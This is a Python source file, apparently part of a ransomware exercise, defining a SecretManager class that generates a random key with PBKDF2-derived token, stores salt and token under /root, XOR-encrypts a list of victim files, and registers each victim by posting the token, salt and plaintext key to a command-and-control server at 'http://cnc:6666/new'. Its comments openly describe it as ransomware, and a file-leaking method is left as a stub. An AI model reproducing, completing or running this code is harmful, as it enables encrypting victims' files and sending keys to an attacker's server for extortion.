from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import json
import base64
import secrets
import string

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile


ITERATION = 48000
TOKEN_LENGTH = 16
SALT_LENGTH = 16
KEY_LENGTH = 16


class SecretManager:

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # PBKDF2HMAC derivation algorithm
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=TOKEN_LENGTH,
            salt=salt,
            iterations=ITERATION,
        )
        # key derivation
        dkey = kdf.derive(key)
        return dkey


    def create(self)->Tuple[bytes, bytes, bytes]:
        # create a random key among asci alphabet with secrets module # EASIER TO READ IN 'key.bin' AND TO TYPE ON KEYBOARD
        alphabet = string.ascii_letters + string.digits
        self._key = bytes(''.join(secrets.choice(alphabet) for i in range(KEY_LENGTH)), 'utf8')
        #self._key = secrets.token_bytes(KEY_LENGTH)

        # generating random salt & key/salt derivation
        self._salt = secrets.token_bytes(SALT_LENGTH) # Salts randomly generated
        self._token = self.do_derivation(self._salt, self._key) # Generate token
        
        print("#create:")        
        return (self._key, self._salt, self._token)


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")


    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        res = requests.post('http://cnc:6666/new',
                      json={
                          "token" : self.get_hex_token(),
                          "salt" : self.bin_to_b64(salt),
                          "key" : self.bin_to_b64(key)
                      }
        )
        print("#post:", str(res))
        return None



    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        self.create()
        
        # do not create token.bin and slat.bin if it's already existing => return
        if os.path.exists(self._path+'/token.bin'):
            # keeps the same secrets if the ransomware restarts
            self.load()
            return None
        
        # first creation of token.bin and salt.bin
        with open(self._path+'/salt.bin', 'wb') as salt:
            salt.write(self._salt)
        
        with open(self._path+'/token.bin', 'wb') as token:
            token.write(self._token)

        # victim registration
        self.post_new(self._salt, self._key, self._token)

        print("#setup:")
        return None
    


    def load(self)->None:
        # function to load crypto data salt & token
        with open(self._path+'/salt.bin', 'rb') as salt:
            self._salt = salt.read(SALT_LENGTH)
        
        with open(self._path+'/token.bin', 'rb') as token:
            self._token = token.read(TOKEN_LENGTH)

        return None


    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid   
        candidate_token = self.do_derivation(self._salt, candidate_key)

        if (candidate_token == self._token):
            return True
        else:
            return False


    def set_key(self, b64_key:bytes)->None:
        # If the key is valid, set the self._key var for decrypting
        if(self.check_key(b64_key)):
            self._key = b64_key
        else:
            raise Exception('Invalid key')
        
        return None


    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        hex_token = self._token.hex()
        return hex_token

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for e in range(len(files)):
            xorfile(files[e], self._key)

        print("#xorfiles:")
        return None


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()


    def clean(self)->None:
        # try removing crypto data from the target
        try:
            os.remove(self._path+'/salt.bin')
            print(f"The salt.bin has been deleted.")
            os.remove(self._path+'/token.bin')
            print(f"The token.bin has been deleted.")
        
        except FileNotFoundError:
            print(f"A file is missing.")
        
        return None